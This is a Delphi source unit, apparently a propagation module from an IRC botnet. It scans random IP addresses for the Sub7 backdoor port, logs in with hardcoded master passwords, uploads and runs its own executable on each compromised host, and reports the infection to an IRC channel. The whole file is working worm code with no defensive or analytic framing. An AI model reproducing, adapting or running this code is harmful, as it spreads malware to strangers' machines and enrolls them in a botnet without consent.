unit pSub7;

interface

uses
  Windows, Winsock, Bot;

  Procedure StartSub7(Clones: DWord);

implementation

Type
  TSub7 = CLASS(TObject)
  Private
    szIPAddress : String;
    Function Sub7_Receive(sSock: TSocket): integer;
    Function Sub7(IP: String): Bool;
  Public
    Procedure StartSub7;
End;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

Function TSub7.Sub7_Receive(sSock: TSocket): integer;
Var
  TimeOut: TimeVal;
  Fd_Struct: TFDSet;
Begin
  TimeOut.tv_sec := 30;
  TimeOut.tv_usec := 0;

  FD_ZERO(FD_STRUCT);
  FD_SET(sSock, FD_STRUCT);

  If Select(0, @FD_STRUCT, NIL, NIL, @TIMEOUT) <= 0 Then
  Begin
    CloseSocket(sSock);
    Result := -1;
    Exit;
  End;
  Result := 0;
End;

Function TSub7.Sub7(IP: String): Bool;
Var
  Buffer : Array[0..4000] Of Char;
  Rep    : Integer;
  C      : Cardinal;
  Mode   : Integer;
  Mode2  : DWord;
  sSock  : TSocket;
  Addr   : TSockAddrIn;
  Temp   : String;

  BotFile : Array[0..MAX_PATH] Of Char;
  tmpBuf  : Array[0..1041] Of Char;
  TestFile: THandle;
  Size    : Integer;
  inFile  : THandle;
  Err     : DWord;
  Wsa     : TWSAData;
Label
  En, Restart;
Begin

  Mode := 0;
  Mode2:= 0;
  Rep := 0;

  WSAStartUp(MakeWord(2,2), WSA);

  Result := False;
  sSock := Socket(AF_INET, 1, 0);
  If sSock = INVALID_SOCKET Then Exit;

  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(27347);
  Addr.sin_addr.S_addr := inet_addr(pchar(ip));

  Connect(sSock, Addr, SizeOf(Addr));
  IOCTLSocket(sSock, FIONBIO, Mode);

Restart:
  FillChar(Buffer, SizeOf(Buffer), #0);
  If Sub7_Receive(sSock) = -1 Then Goto En;
  If Recv(sSock, Buffer, SizeOf(Buffer), 0) <= 0 Then Goto En;

  If String(Buffer) = 'PWD' Then
  Begin
    If Rep > 1 Then Goto En
    Else
    Begin
      If Rep = 0 Then Temp := 'PWD715' Else Temp := 'PWD14438136782715101980';
      Inc(Rep);
      If Send(sSock, Temp[1], Length(Temp), 0) <= 0 Then Goto En;
      Goto Restart;
    End;
  End;

  If Pos('connected.', String(Buffer)) > 0 Then
  Begin
    Temp := 'UPS';
    Send(sSock, Temp[1], Length(Temp), 0);

    FillChar(Buffer, SizeOf(Buffer), #0);
    If Sub7_Receive(sSock) = -1 Then Goto En;
    Recv(sSock, Buffer, SizeOf(Buffer), 0);
    If String(Buffer) <> 'TID' Then Goto En;

    GetModuleFileName(0, BotFile, SizeOf(BotFile));
    TestFile := CreateFile(BotFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    If TestFile = INVALID_HANDLE_VALUE Then Goto En;
    Size := GetFileSize(TestFile, NIL);
    CloseHandle(TestFile);

    Temp := 'SFT05'+IntToStr(Size);
    Send(sSock, Temp[1], Length(Temp), 0);

    inFile := CreateFile(BotFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    While True Do
    Begin
      FillChar(tmpBuf, SizeOf(tmpBuf), 0);
      ReadFile(inFile, tmpBuf, 1, C, NIL);
      If C = 0 Then Break;
      If Send(sSock, tmpBuf, SizeOf(tmpBuf), 0) <= 0 Then
      Begin
        CloseHandle(inFile);
        Goto En;
      End;
    End;
    CloseHandle(inFile);
    C := 0;

    Err := Recv(sSock, Buffer, SizeOf(Buffer), 0);
    While Err > 0 Do
    Begin
      If ((C > 3) or (Sub7_Receive(sSock) = -1)) Then Break;
      Err := Recv(sSock, Buffer, SizeOf(Buffer), 0);
      Inc(C);
    End;
    CloseSocket(sSock);
    // IRCLOG
    Result := True;
  End Else If (Rep = 1) Then
  Begin
    CloseSocket(sSock);
    Sleep(2000);
    sSock := Socket(AF_INET, 1, 0);
    If sSock = INVALID_SOCKET Then Exit;

    Addr.sin_family := AF_INET;
    Addr.sin_port := hTons(27347);
    Addr.sin_addr.S_addr := inet_addr(pchar(ip));

    Connect(sSock, Addr, SizeOf(Addr));
    IOCTLSocket(sSock, FIONBIO, Mode);
    Goto Restart;
  End;
  If Result Then
  Begin
    Inc(Sb7);
    SendData('PRIVMSG ##pktb :[SUB7]Exploited '+IP+#10);
  End;
  Exit;
En:
  CloseSocket(sSock);
  WsaCleanUp;
End;

Procedure TSub7.StartSub7;
Begin
  Randomize;
  szIPAddress:=IntToStr(Random(222)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1)+'.'+IntToStr(Random(255)+1);
  Sub7(szIPAddress);
End;

Procedure StartRandomThread;
Var
  Sub: TSub7;
Begin
  Sub := TSub7.Create;
  Sub.StartSub7;
End;

Procedure StartSub7(Clones: DWord);
var
  i  : Integer;
  ThreadID: Cardinal;
Begin
  For I := 0 To Clones -1 Do
    BeginThread(NIL,0,@StartRandomThread,NIL,0,ThreadID);
End;

end.
